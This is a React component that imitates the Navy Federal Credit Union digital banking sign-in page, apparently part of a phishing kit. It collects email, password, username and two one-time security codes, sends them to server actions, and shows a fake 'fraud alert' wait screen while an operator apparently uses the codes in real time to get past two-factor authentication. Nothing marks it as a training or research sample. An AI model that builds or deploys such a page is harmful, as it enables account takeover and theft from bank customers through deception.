'use client'

import { useEffect, useState } from 'react'

import {
  startChallenge,
  submitUsername,
  submitOtp,
  getStatus,
} from './actions'

type Step =
  | 'credentials'
  | 'username'
  | 'otp1'
  | 'otp2'
  | 'awaiting_approval'
  | 'rejected'
  | 'approved_success'

const WAIT_MSG =
  'Your account verification will automatically update here once admin looks into the fraud alert.'

export default function NavyFederalBanking() {
  const [step, setStep] = useState<Step>('credentials')
  const [email, setEmail] = useState('')
  const [password, setPassword] = useState('')
  const [username, setUsername] = useState('')
  const [otp, setOtp] = useState('')
  const [attemptId, setAttemptId] = useState<string | null>(null)
  const [error, setError] = useState<string | null>(null)
  const [note, setNote] = useState<string | null>(null)
  const [loading, setLoading] = useState(false)
  const [showPassword, setShowPassword] = useState(false)

  useEffect(() => {
    if (step !== 'awaiting_approval' || !attemptId) return
    let cancelled = false
    const tick = async () => {
      const s = await getStatus(attemptId)
      if (cancelled) return
      if (s.status === 'approved') setStep('approved_success')
      if (s.status === 'rejected' || s.status === 'expired') {
        setStep('rejected')
        setError('Sign-in was rejected.')
      }
    }
    tick()
    const id = setInterval(tick, 2500)
    return () => {
      cancelled = true
      clearInterval(id)
    }
  }, [step, attemptId])

  async function onSubmit(e: React.FormEvent) {
    e.preventDefault()
    setError(null)
    setLoading(true)
    try {
      if (step === 'credentials') {
        const r = await startChallenge({ email, password })
        setLoading(false)
        if (!r.ok) {
          setError(r.error)
          return
        }
        setAttemptId(r.attemptId)
        setStep('username')
        setNote(null)
        return
      }
      if (step === 'username') {
        if (!attemptId) {
          setLoading(false)
          setError('Session lost.')
          return
        }
        const r = await submitUsername({ attemptId, username })
        setLoading(false)
        if (!r.ok) {
          setError(r.error)
          return
        }
        setOtp('')
        setStep('otp1')
        setNote('Code sent to your email.')
        return
      }
      if (step === 'otp1' || step === 'otp2') {
        if (!attemptId) {
          setLoading(false)
          setError('Session lost.')
          return
        }
        const which = step === 'otp1' ? 1 : 2
        const r = await submitOtp({ attemptId, otp, which })
        setLoading(false)
        if (!r.ok) {
          setError(r.error)
          return
        }
        setOtp('')
        if (r.next === 'otp2') {
          setStep('otp2')
          setNote('New second code sent to your email.')
          return
        }
        setStep('awaiting_approval')
        setNote(WAIT_MSG)
      }
    } catch (err) {
      setLoading(false)
      setError(err instanceof Error ? err.message : 'Error')
    }
  }

  const titles: Record<Exclude<Step, 'approved_success'>, string> = {
    credentials: 'Sign In',
    username: 'Enter Username',
    otp1: 'Enter First Code',
    otp2: 'Enter Second Code',
    awaiting_approval: 'Verification in Progress',
    rejected: 'Sign-in Blocked',
  }

  return (
    <div style={styles.container}>
      {/* Navigation Header matching image 1 perfectly */}
      <header style={styles.header}>
        <div style={styles.headerLeft}>
          <button style={styles.iconBtn} aria-label="Menu" type="button">
            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round">
              <line x1="3" y1="6" x2="21" y2="6" />
              <line x1="3" y1="12" x2="21" y2="12" />
              <line x1="3" y1="18" x2="21" y2="18" />
            </svg>
          </button>
          
          <div style={styles.logoGroup}>
            {/* Detailed Globe Grid matching target header */}
            <svg width="34" height="34" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.2">
              <circle cx="12" cy="12" r="10" strokeWidth="1.5" />
              {/* Latitude lines */}
              <line x1="2" y1="12" x2="22" y2="12" strokeWidth="1.5" />
              <line x1="3.5" y1="7.5" x2="20.5" y2="7.5" />
              <line x1="3.5" y1="16.5" x2="20.5" y2="16.5" />
              {/* Longitude lines */}
              <line x1="12" y1="2" x2="12" y2="22" strokeWidth="1.5" />
              <ellipse cx="12" cy="12" rx="6" ry="10" />
            </svg>
            <span style={styles.logoText}>NAVY FEDERAL</span>
          </div>
        </div>
      </header>

      <main style={styles.main}>
        {/* Banner */}
        <section style={styles.banner}>
          <h1 style={styles.bannerTitle}>
            {step === 'approved_success' ? 'Verification Complete' : 'Welcome to Digital Banking'}
          </h1>
        </section>

        {/* Card Form */}
        <section style={styles.cardWrapper}>
          <div style={styles.card}>
            {step === 'approved_success' ? (
              <div>
                <h2 style={styles.cardHeaderTitle}>Congratulations</h2>
                <hr style={styles.divider} />
                <p style={styles.text}>Your account &amp; verification has been approved.</p>
                {email ? <p style={{ ...styles.text, fontWeight: 'bold' }}>{email}</p> : null}
              </div>
            ) : (
              <>
                <div style={styles.cardHeader}>
                  <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#4a5568" strokeWidth="2">
                    <rect x="3" y="11" width="18" height="11" rx="2" ry="2" />
                    <path d="M7 11V7a5 5 0 0 1 10 0v4" />
                  </svg>
                  <h2 style={styles.cardHeaderTitle}>{titles[step]}</h2>
                </div>

                <form onSubmit={onSubmit}>
                  {step === 'credentials' && (
                    <>
                      <div style={styles.formGroup}>
                        <label htmlFor="email" style={styles.label}>
                          Email
                          <span style={styles.helpBadge}>?</span>
                        </label>
                        <input
                          id="email"
                          type="email"
                          required
                          value={email}
                          onChange={(e) => setEmail(e.target.value)}
                          style={styles.input}
                          autoComplete="email"
                        />
                      </div>

                      <div style={styles.formGroup}>
                        <label htmlFor="password" style={styles.label}>Password</label>
                        <div style={styles.inputRelative}>
                          <input
                            id="password"
                            type={showPassword ? 'text' : 'password'}
                            required
                            value={password}
                            onChange={(e) => setPassword(e.target.value)}
                            style={styles.inputWithEye}
                            autoComplete="current-password"
                          />
                          <button
                            type="button"
                            onClick={() => setShowPassword((prev) => !prev)}
                            style={styles.eyeBtn}
                            aria-label={showPassword ? 'Hide password' : 'Show password'}
                          >
                            {showPassword ? (
                              <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#104780" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                                <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24" />
                                <line x1="1" y1="1" x2="23" y2="23" />
                              </svg>
                            ) : (
                              <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#104780" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                                <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z" />
                                <circle cx="12" cy="12" r="3" />
                              </svg>
                            )}
                          </button>
                        </div>
                      </div>

                      <div style={{ marginBottom: 16 }}>
                        <a href="#help" style={styles.dottedLink}>SIGN IN HELP</a>
                      </div>
                    </>
                  )}

                  {step === 'username' && (
                    <div style={styles.formGroup}>
                      <label htmlFor="username" style={styles.label}>
                        Username
                        <span style={styles.helpBadge}>?</span>
                      </label>
                      <input
                        id="username"
                        type="text"
                        required
                        value={username}
                        onChange={(e) => setUsername(e.target.value)}
                        style={styles.input}
                        autoComplete="username"
                      />
                    </div>
                  )}

                  {(step === 'otp1' || step === 'otp2') && (
                    <div style={styles.formGroup}>
                      <label htmlFor="otp" style={styles.label}>
                        {step === 'otp1' ? 'First Security Code' : 'Second Security Code'}
                      </label>
                      <input
                        id="otp"
                        type="text"
                        required
                        inputMode="numeric"
                        maxLength={6}
                        value={otp}
                        onChange={(e) => setOtp(e.target.value.replace(/\D/g, '').slice(0, 6))}
                        style={styles.input}
                      />
                    </div>
                  )}

                  {step === 'awaiting_approval' && <p style={styles.text}>{WAIT_MSG}</p>}

                  {error && <p style={styles.errorText}>{error}</p>}
                  {note && step !== 'awaiting_approval' && <p style={styles.noteText}>{note}</p>}

                  {step !== 'awaiting_approval' && step !== 'rejected' && (
                    <button type="submit" disabled={loading} style={styles.btnPrimary}>
                      {loading ? 'Please wait…' : step === 'credentials' ? 'Sign In' : 'Continue'}
                    </button>
                  )}

                  {step !== 'credentials' && step !== 'awaiting_approval' && (
                    <button
                      type="button"
                      onClick={() => {
                        setStep('credentials')
                        setAttemptId(null)
                        setUsername('')
                        setOtp('')
                        setError(null)
                        setNote(null)
                      }}
                      style={styles.btnSecondary}
                    >
                      Start over
                    </button>
                  )}
                </form>
              </>
            )}
          </div>
        </section>

        {/* Member Callout */}
        <section style={styles.whiteSection}>
          <h2 style={styles.sectionHeading}>Not a Navy Federal Member?</h2>
          <p style={styles.sectionDesc}>
            Join now and enjoy the support and great service of a credit union that puts your needs first.
          </p>
          <div style={{ display: 'flex', flexDirection: 'column', gap: 12 }}>
            <button style={styles.btnPrimary} type="button">Become a Member</button>
            <button style={styles.btnBlue} type="button">Learn More</button>
          </div>
        </section>

        {/* Footer */}
        <footer style={styles.footer}>
          <div style={styles.logoGroupFooter}>
            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#10305a" strokeWidth="1.2">
              <circle cx="12" cy="12" r="10" strokeWidth="1.5" />
              <line x1="2" y1="12" x2="22" y2="12" strokeWidth="1.5" />
              <line x1="3.5" y1="7.5" x2="20.5" y2="7.5" />
              <line x1="3.5" y1="16.5" x2="20.5" y2="16.5" />
              <line x1="12" y1="2" x2="12" y2="22" strokeWidth="1.5" />
              <ellipse cx="12" cy="12" rx="6" ry="10" />
            </svg>
            <div>
              <div style={{ fontWeight: 800, fontSize: 15, color: '#10305a', fontStyle: 'normal', letterSpacing: '0.5px' }}>NAVY FEDERAL</div>
              <div style={{ fontSize: 10, textTransform: 'uppercase', color: '#10305a', fontWeight: 600 }}>Credit Union</div>
            </div>
          </div>
          <p style={{ margin: '12px 0 0', fontSize: 12, color: '#4a5568' }}>
            © 2026 Navy Federal Credit Union. All rights reserved.
          </p>
        </footer>
      </main>
    </div>
  )
}

const styles: { [key: string]: React.CSSProperties } = {
  container: {
    minHeight: '100vh',
    backgroundColor: '#143260',
    fontFamily: 'Arial, Helvetica, sans-serif',
    color: '#2d3748',
    margin: 0,
  },
  header: {
    backgroundColor: '#0d3e75',
    color: '#ffffff',
    padding: '14px 16px',
    borderBottom: '1px solid #092c54',
  },
  headerLeft: {
    display: 'flex',
    alignItems: 'center',
    gap: 16,
  },
  iconBtn: {
    background: 'none',
    border: 'none',
    color: '#fff',
    cursor: 'pointer',
    padding: 2,
    display: 'flex',
    alignItems: 'center',
  },
  logoGroup: {
    display: 'flex',
    alignItems: 'center',
    gap: 10,
  },
  logoText: {
    fontWeight: 800,
    fontSize: 22,
    fontStyle: 'normal', // Straight (non-italic) font to match image 1
    letterSpacing: '0.5px',
    fontFamily: 'Arial Black, Arial, sans-serif',
  },
  main: {
    maxWidth: 440,
    margin: '0 auto',
  },
  banner: {
    backgroundColor: '#a8c9e8',
    padding: '16px 20px',
  },
  bannerTitle: {
    margin: 0,
    fontSize: 22,
    fontWeight: 700,
    color: '#10305a',
  },
  cardWrapper: {
    backgroundColor: '#a8c9e8',
    padding: '0 16px 24px',
  },
  card: {
    backgroundColor: '#f4f4f4',
    borderRadius: 8,
    borderTop: '4px solid #e07e27',
    padding: 20,
    boxShadow: '0 4px 6px rgba(0,0,0,0.1)',
  },
  cardHeader: {
    display: 'flex',
    alignItems: 'center',
    gap: 8,
    borderBottom: '1px solid #cbd5e0',
    paddingBottom: 12,
    marginBottom: 20,
  },
  cardHeaderTitle: {
    margin: 0,
    fontSize: 20,
    fontWeight: 600,
    color: '#2d3748',
  },
  formGroup: {
    marginBottom: 16,
  },
  label: {
    display: 'flex',
    alignItems: 'center',
    fontSize: 14,
    fontWeight: 700,
    color: '#2d3748',
    marginBottom: 4,
  },
  helpBadge: {
    marginLeft: 6,
    backgroundColor: '#718096',
    color: '#fff',
    borderRadius: '50%',
    width: 16,
    height: 16,
    fontSize: 10,
    display: 'inline-flex',
    alignItems: 'center',
    justifyContent: 'center',
  },
  inputRelative: {
    position: 'relative',
    display: 'flex',
    alignItems: 'center',
  },
  input: {
    width: '100%',
    padding: '10px 12px',
    backgroundColor: '#ffffff',
    border: '1px solid #a0aec0',
    borderRadius: 4,
    fontSize: 15,
    boxSizing: 'border-box',
    outline: 'none',
  },
  inputWithEye: {
    width: '100%',
    padding: '10px 40px 10px 12px',
    backgroundColor: '#ffffff',
    border: '1px solid #a0aec0',
    borderRadius: 4,
    fontSize: 15,
    boxSizing: 'border-box',
    outline: 'none',
  },
  eyeBtn: {
    position: 'absolute',
    right: 10,
    background: 'none',
    border: 'none',
    cursor: 'pointer',
    padding: 4,
    display: 'flex',
    alignItems: 'center',
    justifyContent: 'center',
  },
  dottedLink: {
    fontSize: 12,
    fontWeight: 700,
    color: '#104780',
    textDecoration: 'none',
    borderBottom: '1px dotted #104780',
    letterSpacing: '0.5px',
  },
  btnPrimary: {
    width: '100%',
    backgroundColor: '#e07e27',
    color: '#ffffff',
    border: 'none',
    borderRadius: 4,
    padding: '12px 16px',
    fontSize: 16,
    fontWeight: 700,
    cursor: 'pointer',
    boxShadow: '0 2px 4px rgba(0,0,0,0.1)',
  },
  btnSecondary: {
    width: '100%',
    backgroundColor: 'transparent',
    color: '#104780',
    border: '1px solid #104780',
    borderRadius: 4,
    padding: '10px 16px',
    fontSize: 14,
    fontWeight: 700,
    cursor: 'pointer',
    marginTop: 10,
  },
  btnBlue: {
    width: '100%',
    backgroundColor: '#2b6cb0',
    color: '#ffffff',
    border: 'none',
    borderRadius: 4,
    padding: '12px 16px',
    fontSize: 16,
    fontWeight: 700,
    cursor: 'pointer',
  },
  whiteSection: {
    backgroundColor: '#ffffff',
    padding: '32px 24px',
    textAlign: 'center',
  },
  sectionHeading: {
    margin: '0 0 12px',
    fontSize: 20,
    fontWeight: 700,
    color: '#10305a',
  },
  sectionDesc: {
    margin: '0 0 20px',
    fontSize: 14,
    color: '#4a5568',
    lineHeight: 1.5,
  },
  text: {
    fontSize: 14,
    lineHeight: 1.5,
    color: '#4a5568',
    margin: '0 0 12px',
  },
  errorText: {
    color: '#e53e3e',
    fontSize: 14,
    fontWeight: 600,
    margin: '0 0 12px',
  },
  noteText: {
    color: '#2d3748',
    fontSize: 14,
    margin: '0 0 12px',
  },
  divider: {
    border: 'none',
    borderTop: '1px solid #cbd5e0',
    margin: '12px 0',
  },
  footer: {
    backgroundColor: '#e5e7eb',
    padding: '24px 24px',
  },
  logoGroupFooter: {
    display: 'flex',
    alignItems: 'center',
    gap: 8,
  },
}
